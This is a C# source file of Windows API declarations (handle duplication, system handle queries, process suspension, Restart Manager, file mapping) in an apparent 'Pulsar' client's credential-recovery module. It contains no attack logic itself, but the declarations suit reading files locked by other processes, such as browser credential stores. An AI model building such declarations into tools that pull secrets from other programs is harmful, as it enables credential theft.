using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Pulsar.Client.Recovery.Utilities.Xeno.InternalStructsXeno;

namespace Pulsar.Client.Recovery.Utilities.Xeno
{
    public static class NativeMethodsXeno
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hProcess);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwOptions
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true, EntryPoint = "NtQueryInformationProcess")]
        private static extern int _NtQueryPbi32(
        IntPtr ProcessHandle,
        InternalStructsXeno.PROCESSINFOCLASS ProcessInformationClass,
        ref InternalStructsXeno.PROCESS_BASIC_INFORMATION ProcessInformation,
        uint BufferSize,
        ref uint NumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern InternalStructsXeno.FileType GetFileType(IntPtr hFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFinalPathNameByHandleW(IntPtr hFile, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetFileSizeEx(IntPtr hFile, out ulong FileSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQuerySystemInformation(InternalStructsXeno.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern uint RmRegisterResources(uint dwSessionHandle, uint nFiles, string[] rgsFileNames, uint nApplications, RM_UNIQUE_PROCESS[] rgApplications, uint nServices, string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern uint RmStartSession(out uint pSessionHandle, uint dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll", SetLastError = true)]
        public static extern uint RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll", SetLastError = true)]
        public static extern uint RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps, out InternalStructsXeno.RM_REBOOT_REASON lpdwRebootReasons);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQueryInformationFile(IntPtr FileHandle, ref IO_STATUS_BLOCK IoStatusBlock, IntPtr FileInformation, uint Length, uint FileInformationClass);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtSuspendProcess(IntPtr ProcessHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtResumeProcess(IntPtr ProcessHandle);

        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentProcessId();
    }
}
